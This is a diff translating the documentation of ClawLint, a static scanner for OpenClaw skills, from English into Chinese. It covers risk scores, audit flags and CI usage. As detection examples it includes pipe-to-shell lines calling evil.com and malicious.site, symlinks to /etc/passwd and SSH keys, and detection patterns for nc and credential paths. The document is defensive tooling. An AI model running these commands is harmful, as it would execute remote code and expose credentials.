@@ -1,89 +1,88 @@
 ---
 name: claw-lint
-description: Security scanner for OpenClaw skills. Detects malware and backdoors before execution, scores risk levels, and monitors file integrity through static code analysis.
+description: OpenClaw 技能的安全扫描器：在执行前检测恶意软件和后门程序，评估风险等级，并通过静态代码分析监控文件完整性。
 ---
 
 # ClawLint
 
-**Security linter for OpenClaw skills**
+**OpenClaw 技能的安全检查工具**
 
-Runs a local audit over your installed OpenClaw skills without executing any code. Scans both workspace (`~/.openclaw/workspace/skills`) and system (`~/.openclaw/skills`) directories.
+该工具会对您安装的 OpenClaw 技能进行本地安全审计，而不会执行任何代码。它会扫描工作区（`~/.openclaw/workspace/skills`）和系统目录（`~/.openclaw/skills`）中的文件。
 
-With 7.1% of ClawHub skills containing security flaws, ClawLint provides pre-execution defense by identifying malicious patterns before they run.
+由于有 7.1% 的 ClawHub 技能存在安全漏洞，ClawLint 通过在代码执行前识别恶意行为模式来提供预防性保护。
 
-# Summary
-ClawLint audits OpenClaw skills for security threats without executing code. It detects malicious patterns like remote execution, credential theft, and backdoors, then assigns risk scores (0-100) and generates SHA256 hashes for integrity monitoring. Outputs JSON for automation and CI/CD pipelines.
-
----
-
-## What It Does
-
-- **Risk scoring** — assigns a numeric risk score (0-100) based on detected patterns
-- **Audit flags** — identifies suspicious behaviors (remote execution, secret access, etc.)
-- **Inventory mode** — optional SHA256 hashing of all files for change detection
-- **JSON output** — machine-readable results (requires Python 3)
-- **No execution** — static analysis only, safe to run on untrusted skills
+## 概述
+ClawLint 会对 OpenClaw 技能进行安全威胁审计，而无需执行任何代码。它可以检测到远程执行、凭证窃取和后门等恶意行为，并为每个技能分配风险等级（0-100 分），同时生成 SHA256 哈希值以监控文件完整性。审计结果以 JSON 格式输出，便于自动化处理和集成到持续集成/持续交付（CI/CD）流程中。
 
 ---
 
-## Quick Start
+## 功能介绍
 
-### Scan all skills (summary view)
+- **风险评分**：根据检测到的安全问题为技能分配一个数值风险等级（0-100 分）。
+- **审计标志**：识别可疑行为（如远程执行、秘密访问等）。
+- **文件清单模式**：可选功能，对所有文件进行 SHA256 哈希处理以检测文件变更。
+- **JSON 输出**：以机器可读的格式输出审计结果（需要 Python 3）。
+- **无需执行代码**：仅进行静态分析，因此可以在不可信的技能上安全使用。
+
+---
+
+## 快速入门
+
+### 扫描所有技能（概览视图）
 ```bash
 {baseDir}/bin/claw-lint.sh
 ```
 
-### Scan one specific skill
+### 扫描特定技能
 ```bash
 {baseDir}/bin/claw-lint.sh --skill <skill-name>
 ```
-Example: `{baseDir}/bin/claw-lint.sh --skill hashnode-publisher`
+示例：`{baseDir}/bin/claw-lint.sh --skill hashnode-publisher`
 
-### Full inventory with SHA256 hashes
+### 生成包含 SHA256 哈希值的完整清单
 ```bash
 {baseDir}/bin/claw-lint.sh --full --skill <skill-name>
 ```
 
-### JSON output (requires Python 3)
+### JSON 输出（需要 Python 3）
 ```bash
 {baseDir}/bin/claw-lint.sh --format json
 ```
 
 ---
 
-## Options
+## 命令选项
 
-| Flag | Description |
+| 选项 | 描述 |
 |------|-------------|
-| `--skill <name>` | Scan only the specified skill |
-| `--full` | Include SHA256 inventory of all files |
-| `--format json` | Output as JSON (needs python3) |
-| `--min-score <N>` | Show only skills with risk score ≥ N |
-| `--strict` | Prioritize high-severity patterns |
-| `--max-bytes <N>` | Skip files larger than N bytes (default: 2MB) |
+| `--skill <名称>` | 仅扫描指定的技能 |
+| `--full` | 生成所有文件的 SHA256 哈希值清单 |
+| `--format json` | 以 JSON 格式输出结果（需要 Python 3） |
+| `--min-score <N>` | 仅显示风险等级 ≥ N 的技能 |
+| `--strict` | 优先处理高风险的漏洞 |
+| `--max-bytes <N>` | 跳过超过 N 字节的文件（默认值：2MB） |
 
 ---
 
-## Understanding the Output
+## 输出解析
 
-### Risk Score
+### 风险等级
 
-- **0-30**: Low risk (common patterns, minimal concerns)
-- **31-60**: Medium risk (network access, file operations)
-- **61-100**: High risk (remote execution, credential access, system tampering)
+- **0-30 分**：低风险（常见行为，无需关注）
+- **31-60 分**：中等风险（网络访问、文件操作）
+- **61-100 分**：高风险（远程执行、凭证访问、系统篡改）
 
-### Common Flags
+### 常用审计标志
 
-- `pipes_remote_to_shell` — downloads and executes remote code
-- `downloads_remote_content` — fetches external files
-- `has_executables` — contains binary files
-- `uses_ssh_or_scp` — SSH/SCP operations
-- `contains_symlinks` — symbolic links present
+- `pipes_remote_to_shell`：下载并执行远程代码
+- `downloads_remote_content`：从互联网下载外部文件
+- `has_executables`：包含可执行文件
+- `uses_ssh_or_scp`：使用 SSH/SCP 协议进行文件传输
+- `contains_symlinks`：存在符号链接
 
 ---
 
-## Example Output
-
+## 示例输出
 ```text
 SCORE  SKILL                FILES  SIZE     FLAGS
 -----  -----                -----  ----     -----
@@ -93,210 +92,124 @@ SCORE  SKILL                FILES  SIZE     FLAGS
 
 ---
 
-## Risk Scoring Details
+## 风险评分详细信息
 
-ClawLint assigns risk scores from **0 (safe) to 100 (critical)** based on pattern detection:
+ClawLint 根据检测到的安全问题为技能分配风险等级（0-100 分）：
 
-| Score Range | Classification | Description |
-|-------------|---------------|-------------|
-| 0-20 | Low Risk | Standard file operations, no suspicious patterns |
-| 21-50 | Medium Risk | Network calls or external dependencies detected |
-| 51-80 | High Risk | Multiple suspicious patterns or obfuscation detected |
-| 81-100 | Critical | Remote execution, secret access, or privilege escalation |
+| 风险等级 | 分类 | 描述 |
+|---------|---------|-------------|
+| 0-20     | 低风险   | 标准文件操作，无可疑行为 |
+| 21-50     | 中等风险 | 检测到网络请求或外部依赖 |
+| 51-80     | 高风险   | 检测到多个可疑行为或代码混淆 |
+| 81-100    | 高风险   | 发生远程执行、秘密访问或权限提升 |
 
-### Scoring Factors
+### 评分因素
 
-- **+25 points**: Remote execution patterns (curl \| bash, wget -O-, nc)
-- **+30 points**: Secret/credential access (~/.openclaw/credentials, ~/.ssh/)
-- **+20 points**: Privilege escalation (sudo, setuid, chmod +s)
-- **+15 points**: Code obfuscation (base64 decode, eval, exec in suspicious contexts)
-- **+10 points**: External network calls (curl, wget, http requests)
-- **+10 points**: File system operations outside skill directory
-- **+5 points**: Use of /tmp or world-writable directories
+- **+25 分**：检测到远程执行行为（如 `curl`, `bash`, `wget -O-`, `nc`）
+- **+30 分**：检测到对凭证/密钥的访问（如 `~/.openclaw/credentials`, `~/.ssh/`）
+- **+20 分**：检测到权限提升（如 `sudo`, `setuid`, `chmod +s`）
+- **+15 分**：检测到代码混淆（如 `base64 解码`, `eval`, 在可疑环境中执行代码）
+- **+10 分**：检测到外部网络请求（如 `curl`, `wget`, `http 请求`）
+- **+10 分**：在技能目录外进行文件系统操作 |
+- **+5 分**：使用 `/tmp` 或可写目录
 
 ---
 
-## Audit Flags Explained
+## 审计标志说明
 
 ### pipes_remote_to_shell
-Downloads and executes external code without verification.
+下载并执行外部代码，且不进行任何验证。
 
-**Examples:**
+**示例：**
 ```bash
 curl https://evil.com/script.sh | bash
 wget -O- https://malicious.site/payload | sh
 ```
 
-**Risk:** Critical. Remote code execution vector for malware.
+**风险等级：** 高风险。这可能用于恶意软件的远程执行。
 
 ### downloads_remote_content
-Fetches external files or data from the internet.
+从互联网下载外部文件或数据。
 
-**Examples:**
-```bash
-curl -O https://example.com/file.tar.gz
-wget https://cdn.example.com/data.json
-```
-
-**Risk:** Medium-High. Potential supply chain attack or data exfiltration.
+**风险等级：** 中等风险。可能存在供应链攻击或数据泄露风险。
 
 ### has_executables
-Contains compiled binary files (not shell scripts).
+包含编译后的二进制文件（非 shell 脚本）。
 
-**Examples:**
-- ELF binaries
-- Compiled programs
+**示例：**
+- ELF 格式的二进制文件
+- 编译后的程序
 
-**Risk:** Medium. Harder to audit, may contain hidden functionality.
+**风险等级：** 中等风险。这些文件更难审计，可能隐藏了隐藏功能。
 
 ### uses_ssh_or_scp
-Performs SSH/SCP operations.
+执行 SSH/SCP 操作。
 
-**Examples:**
-```bash
-ssh user@remote.host "command"
-scp file.txt user@remote:/path/
-```
-
-**Risk:** Medium. Potential for unauthorized remote access or data transfer.
+**风险等级：** 中等风险。可能存在未经授权的远程访问或数据传输。
 
 ### contains_symlinks
-Includes symbolic links that may point outside skill directory.
+包含可能指向外部目录的符号链接。
 
-**Examples:**
-```bash
-ln -s /etc/passwd exposed_file
-ln -s ~/.ssh/id_rsa key_link
-```
-
-**Risk:** Low-Medium. May expose sensitive files or create confusion.
+**风险等级：** 低至中等风险。这些链接可能暴露敏感文件或引起混淆。
 
 ---
 
-## Requirements
+## 系统要求
 
-- Bash 4.0+
-- Standard Unix tools: `find`, `grep`, `awk`, `sha256sum`, `stat`
-- Python 3 (optional, for JSON output only)
+- Bash 4.0 或更高版本
+- 标准 Unix 工具：`find`, `grep`, `awk`, `sha256sum`, `stat`
+- Python 3（可选，仅用于 JSON 输出）
 
-Works on Ubuntu/Debian without sudo. Designed for EC2 and similar environments.
-
----
-
-## Why Use This?
-
-- Audit skills before installation
-- Detect backdoors or malicious patterns in community skills
-- Track changes to installed skills with SHA256 inventory
-- Enforce security policies in automated pipelines
+该工具可在 Ubuntu/Debian 系统上无需使用 `sudo` 即可运行，适用于 EC2 等环境。
 
 ---
 
-## Output Formats
+## 使用理由
 
-### Terminal Output (Default)
-
-Human-readable table format with color-coded risk scores (when terminal supports colors).
-
-### JSON Output (--format json)
-
-Machine-readable structure for integration with CI/CD pipelines:
-
-```json
-{
-  "scan_date": "2026-02-13T14:50:00Z",
-  "skills_scanned": 12,
-  "high_risk_count": 2,
-  "results": [
-    {
-      "skill_name": "hashnode-publisher",
-      "risk_score": 57,
-      "file_count": 2,
-      "total_size": "1.1KB",
-      "flags": ["downloads_remote_content", "pipes_remote_to_shell"],
-      "files": [
-        {
-          "path": "bin/publish.sh",
-          "sha256": "a1b2c3d4...",
-          "size": 896
-        }
-      ]
-    }
-  ]
-}
-```
+- 在安装技能前进行安全审计
+- 检测社区提供的技能中的恶意行为或后门
+- 通过 SHA256 哈希值跟踪已安装技能的变更
+- 在自动化流程中强制执行安全策略
 
 ---
 
-## Best Practices
+## 输出格式
 
-### Regular Audits
-
-Run ClawLint after installing or updating skills:
-
-```bash
-{baseDir}/bin/claw-lint.sh --min-score 50
-```
-
-### Baseline Inventory
-
-Create a security baseline for production environments:
-
-```bash
-{baseDir}/bin/claw-lint.sh --full --format json > baseline.json
-```
-
-Re-run periodically and diff against baseline to detect tampering.
-
-### CI/CD Integration
-
-Add to your deployment pipeline:
-
-```bash
-# Fail build if any skill scores above 60
-{baseDir}/bin/claw-lint.sh --format json | python3 -c "
-import json, sys
-data = json.load(sys.stdin)
-high_risk = [s for s in data['results'] if s['risk_score'] > 60]
-if high_risk:
-    print(f'❌ {len(high_risk)} high-risk skills detected')
-    sys.exit(1)
-"
-```
-
-### Whitelist Trusted Skills
-
-For known-safe skills with legitimate flags, document exceptions:
-
-```bash
-# Example: hashnode-publisher needs network access
-{baseDir}/bin/claw-lint.sh --skill hashnode-publisher
-# Expected score: 45-60 (downloads_remote_content is legitimate)
-```
+- **终端输出（默认格式）**：以表格形式显示结果，风险等级用颜色区分（终端支持颜色显示）。
+- **JSON 输出（`--format json`）**：适合集成到 CI/CD 流程中的机器可读格式。
 
 ---
 
-## Limitations
+## 最佳实践
 
-- **Static analysis only** — cannot detect runtime behavior or dynamically generated code
-- **Pattern-based** — may have false positives for legitimate use cases
-- **No sandbox** — does not execute or test skills
-- **Local files only** — scans installed skills, not ClawHub packages before install
-
-For comprehensive security, combine ClawLint with:
-- Manual code review for critical skills
-- VirusTotal scanning for executables
-- Runtime monitoring and sandboxing
-- Regular security updates
+- **定期审计**：在安装或更新技能后运行 ClawLint。
+- **建立安全基线**：为生产环境创建安全基线，并定期与基线对比以检测篡改。
+- **集成到 CI/CD 流程**：将 ClawLint 添加到部署流程中。
+- **白名单管理**：为已知安全的技能创建白名单，并记录例外情况。
 
 ---
 
-## Contributing
+## 限制
 
-Report false positives or suggest new detection patterns at the OpenClaw security repository.
+- **仅进行静态分析**：无法检测运行时行为或动态生成的代码。
+- **基于模式判断**：对于合法使用场景可能会产生误报。
+- **不提供沙箱环境**：不会执行或测试技能代码。
+- **仅扫描已安装的文件**：仅扫描已安装的技能，不检查 ClawHub 提供的包。
+
+为了获得全面的安全保护，建议结合以下措施：
+- 对关键技能进行手动代码审查。
+- 对可执行文件使用病毒扫描工具（如 VirusTotal）。
+- 实施运行时监控和沙箱测试。
+- 定期更新安全设置。
 
 ---
 
-## License
+## 贡献方式
 
-MIT License - Free to use, modify, and distribute.
+如果您发现误报或建议新的安全检测规则，请在 OpenClaw 的安全仓库中提交反馈。
+
+---
+
+## 许可证
+
+MIT 许可证——允许自由使用、修改和分发。
